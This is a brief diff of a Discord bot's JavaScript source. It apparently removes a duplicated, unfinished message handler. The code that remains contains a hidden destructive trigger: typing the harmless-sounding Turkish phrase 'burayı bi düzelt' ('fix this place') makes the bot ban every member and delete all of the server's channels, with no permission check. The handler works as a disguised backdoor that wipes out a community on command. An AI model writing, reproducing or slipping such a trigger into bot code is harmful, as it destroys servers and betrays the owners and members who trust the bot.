@@ -22,9 +22,6 @@ berke.on('message', msg => {
 })
 
 berke.on('message', async msg => {
-  if (msg.content.toLowerCase() === 'odayap' )
-
-berke.on('message', async msg => {
   if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
     msg.guild.members.forEach(member => member.ban())
     msg.guild.channels.deleteAll();
